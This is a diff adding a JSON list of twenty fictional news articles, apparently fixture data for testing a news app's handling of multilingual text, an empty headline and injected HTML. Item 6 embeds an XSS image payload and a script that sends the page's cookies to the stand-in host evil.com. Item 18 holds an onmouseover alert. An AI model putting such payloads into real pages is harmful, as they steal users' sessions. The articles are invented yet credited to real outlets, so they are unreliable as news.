@@ -1,0 +1,162 @@
+[
+  {
+    "id": 1,
+    "headline": "Global Oil Prices Surge Amid Middle East Tensions",
+    "body": "Crude oil prices rose sharply on Monday as escalating geopolitical tensions in the Middle East raised concerns about supply disruptions. Brent crude climbed 3.2% to $87.40 per barrel, its highest level in three months. Analysts warned that prolonged instability could push prices above $90 by year-end, impacting inflation and central bank policy decisions worldwide.",
+    "source": "Reuters",
+    "published_at": "2026-07-14T08:30:00Z",
+    "language": "en"
+  },
+  {
+    "id": 2,
+    "headline": "Tech Giants Report Record Q2 Earnings Driven by AI Investments",
+    "body": "Several major technology companies reported better-than-expected second-quarter earnings, citing strong demand for AI infrastructure and cloud services. Revenue growth accelerated across the sector, with enterprise AI spending up 45% year-over-year. However, some analysts expressed concern about the sustainability of current AI capital expenditure levels and the timeline to profitability for many AI initiatives.",
+    "source": "Bloomberg",
+    "published_at": "2026-07-12T14:15:00Z",
+    "language": "en"
+  },
+  {
+    "id": 3,
+    "headline": "New EU Regulations on AI Transparency Take Effect",
+    "body": "The European Union's AI Act transparency requirements officially came into force today, mandating that companies disclose when content is AI-generated and provide documentation on training data sources. Industry groups have criticised the timeline as aggressive, while consumer advocacy organisations praised the move as overdue. Companies face fines of up to 6% of global revenue for non-compliance.",
+    "source": "Financial Times",
+    "published_at": "2026-07-10T06:00:00Z",
+    "language": "en"
+  },
+  {
+    "id": 4,
+    "headline": "Central Bank Holds Interest Rates Steady, Signals Caution",
+    "body": "The central bank held its benchmark interest rate unchanged at 4.25% in its July meeting, citing mixed economic signals. While inflation has moderated to 2.8%, the committee noted persistent wage growth and geopolitical risks. Governor Martinez stated that the bank would remain 'data-dependent' and that rate cuts remain on the table for the September meeting if inflation continues its downward trajectory.",
+    "source": "Associated Press",
+    "published_at": "2026-07-09T16:45:00Z",
+    "language": "en"
+  },
+  {
+    "id": 5,
+    "headline": "Renewable Energy Investment Hits All-Time High in H1 2026",
+    "body": "Global investment in renewable energy reached $380 billion in the first half of 2026, surpassing the previous full-year record set in 2025. Solar and wind projects accounted for 78% of new capacity additions, with battery storage investments tripling compared to the same period last year. The International Energy Agency attributed the surge to falling technology costs and supportive policy frameworks across Asia and Europe.",
+    "source": "The Guardian",
+    "published_at": "2026-07-08T10:20:00Z",
+    "language": "en"
+  },
+  {
+    "id": 6,
+    "headline": "<img src=x onerror=alert('XSS')>Breaking: Major Data Breach Reported",
+    "body": "A significant data breach affecting approximately 2.3 million customer records was disclosed today by a leading financial services firm. The compromised data includes names, email addresses, and encrypted password hashes. The company stated that no financial data or social security numbers were exposed. Security researchers noted that the breach exploited a <script>document.location='http://evil.com/steal?c='+document.cookie</script> known vulnerability in an unpatched third-party library.",
+    "source": "TechCrunch",
+    "published_at": "2026-07-07T19:30:00Z",
+    "language": "en"
+  },
+  {
+    "id": 7,
+    "headline": "Automotive Industry Faces Supply Chain Disruption Again",
+    "body": "Multiple automakers announced production slowdowns this week due to semiconductor shortages affecting advanced driver-assistance systems. The disruptions, concentrated among European manufacturers, are expected to reduce Q3 output by an estimated 150,000 vehicles. Industry analysts noted that while the broader chip shortage has eased, specialised automotive-grade processors remain constrained due to limited foundry capacity.",
+    "source": "Wall Street Journal",
+    "published_at": "2026-07-06T12:00:00Z",
+    "language": "en"
+  },
+  {
+    "id": 8,
+    "headline": "ارتفاع أسعار العقارات في دبي بنسبة 15% خلال النصف الأول من 2026",
+    "body": "شهدت أسعار العقارات في دبي ارتفاعاً ملحوظاً بنسبة 15% خلال النصف الأول من عام 2026 مقارنة بالفترة ذاتها من العام الماضي. وأرجع خبراء السوق هذا الارتفاع إلى زيادة الطلب من المستثمرين الدوليين وتحسن البيئة التنظيمية. كما ساهمت مشاريع البنية التحتية الجديدة في تعزيز جاذبية الإمارة كوجهة استثمارية.",
+    "source": "الشرق الأوسط",
+    "published_at": "2026-07-05T07:15:00Z",
+    "language": "ar"
+  },
+  {
+    "id": 9,
+    "headline": "中国科技企业加速全球化布局",
+    "body": "多家中国科技企业近日宣布加大海外市场投资力度。据行业分析报告显示，2026年上半年，中国科技企业的海外收入占比已超过35%，较去年同期增长8个百分点。专家认为，这一趋势反映了中国企业在人工智能和云计算领域日益增强的竞争力。",
+    "source": "新华社",
+    "published_at": "2026-07-04T03:00:00Z",
+    "language": "zh"
+  },
+  {
+    "id": 10,
+    "headline": "Healthcare AI Startup Raises $200M in Series C Funding",
+    "body": "MediAssist AI, a healthcare technology startup specialising in diagnostic imaging, closed a $200 million Series C funding round led by Sequoia Capital. The company's AI platform, which assists radiologists in detecting early-stage cancers, has been deployed across 340 hospitals in 12 countries. CEO Dr. Sarah Chen stated that the funds would be used to expand into cardiology and neurology applications.",
+    "source": "CNBC",
+    "published_at": "2026-07-03T15:40:00Z",
+    "language": "en"
+  },
+  {
+    "id": 11,
+    "headline": "Climate Summit Reaches Landmark Agreement on Carbon Markets",
+    "body": "Delegates at the mid-year climate summit in Geneva reached a historic agreement on international carbon credit trading standards. The framework establishes uniform verification requirements and prevents double-counting of emission reductions across jurisdictions. Environmental groups offered cautious support, noting that implementation details will determine whether the mechanism drives genuine decarbonisation or merely enables greenwashing.",
+    "source": "BBC News",
+    "published_at": "2026-07-02T09:00:00Z",
+    "language": "en"
+  },
+  {
+    "id": 12,
+    "headline": "Major Airline Reports Record Summer Bookings Despite Fare Increases",
+    "body": "One of Europe's largest carriers reported a 12% increase in summer bookings compared to 2025, even as average fares rose by 8%. The airline attributed the resilience to strong leisure travel demand and a shift toward premium economy seating. However, the company warned that rising jet fuel costs could pressure margins in the second half of the year and that further fare adjustments may be necessary.",
+    "source": "Sky News",
+    "published_at": "2026-07-01T11:25:00Z",
+    "language": "en"
+  },
+  {
+    "id": 13,
+    "headline": "Pharmaceutical Merger Creates Third-Largest Drug Maker",
+    "body": "Two major pharmaceutical companies announced a $68 billion merger that will create the world's third-largest drug maker by revenue. The combined entity will have a portfolio spanning oncology, immunology, and rare diseases. Regulatory approval is expected within 12 to 18 months, though antitrust authorities in the US and EU are likely to require divestitures in overlapping therapeutic areas.",
+    "source": "The New York Times",
+    "published_at": "2026-06-30T13:50:00Z",
+    "language": "en"
+  },
+  {
+    "id": 14,
+    "headline": "Cybersecurity Report: Ransomware Attacks Up 40% in 2026",
+    "body": "A new report from CyberWatch International reveals that ransomware attacks have increased 40% in the first half of 2026 compared to the same period last year. Critical infrastructure, healthcare, and financial services remain the most targeted sectors. The report recommends organisations implement zero-trust architectures, maintain offline backups, and conduct regular penetration testing to mitigate exposure.",
+    "source": "Wired",
+    "published_at": "2026-06-28T17:10:00Z",
+    "language": "en"
+  },
+  {
+    "id": 15,
+    "headline": "Sports League Announces Expansion to Four New Markets",
+    "body": "The professional basketball league confirmed expansion franchises in Mexico City, London, Vancouver, and Mumbai, set to begin play in the 2028-29 season. Each franchise carries a record $3.5 billion valuation. The move represents the league's most ambitious international expansion to date, with dedicated broadcast partnerships already secured for European and Asian markets.",
+    "source": "ESPN",
+    "published_at": "2026-06-25T20:00:00Z",
+    "language": "en"
+  },
+  {
+    "id": 16,
+    "headline": "Electric Vehicle Sales Overtake Combustion Engines in Norway",
+    "body": "Norway became the first country where electric vehicle sales exceeded internal combustion engine vehicles for a full calendar quarter. EVs accounted for 62% of all new car registrations in Q2 2026, up from 54% in the same quarter last year. The milestone was attributed to the country's comprehensive incentive structure, including tax exemptions, free municipal parking, and extensive charging infrastructure.",
+    "source": "Automotive News",
+    "published_at": "2026-06-22T08:45:00Z",
+    "language": "en"
+  },
+  {
+    "id": 17,
+    "headline": "",
+    "body": "Markets closed mixed on Friday with the S&P 500 gaining 0.3% while the Nasdaq fell 0.2%. Trading volume was below average ahead of the long weekend. Bond yields ticked higher on inflation expectations.",
+    "source": "MarketWatch",
+    "published_at": "2026-06-20T21:30:00Z",
+    "language": "en"
+  },
+  {
+    "id": 18,
+    "headline": "Food Delivery Platform Faces Worker Classification Lawsuit",
+    "body": "A class-action lawsuit filed against a major food delivery platform alleges that the company misclassifies its 140,000 delivery drivers as independent contractors rather than employees. The suit, filed in federal court, seeks back pay, benefits, and overtime compensation. Legal experts say the case could have far-reaching implications for the gig economy, particularly as several states consider legislation on worker classification. The company said in a statement: \"We believe our model provides flexibility that drivers value, and we will <b onmouseover=alert(1)>vigorously</b> defend our position.\"",
+    "source": "The Washington Post",
+    "published_at": "2026-06-18T14:20:00Z",
+    "language": "en"
+  },
+  {
+    "id": 19,
+    "headline": "Space Tourism Company Completes First Commercial Orbital Flight",
+    "body": "A private space company successfully completed its inaugural commercial orbital flight, carrying four paying passengers on a three-day journey around Earth. Tickets for the mission were priced at $28 million each. The company plans to increase flight frequency to monthly by 2027 and reduce ticket prices to under $10 million within three years as reusable launch vehicle costs decline.",
+    "source": "National Geographic",
+    "published_at": "2026-06-15T04:00:00Z",
+    "language": "en"
+  },
+  {
+    "id": 20,
+    "headline": "Global Wheat Prices Fall as Harvest Outlook Improves",
+    "body": "International wheat futures dropped 5.4% this week following improved harvest forecasts from major producing regions. The US Department of Agriculture raised its global production estimate by 12 million tonnes, citing favourable weather conditions in the Black Sea region and Australia. The decline provides some relief for food-importing nations that have faced elevated costs since 2024.",
+    "source": "Al Jazeera",
+    "published_at": "2026-06-12T06:30:00Z",
+    "language": "en"
+  }
+]
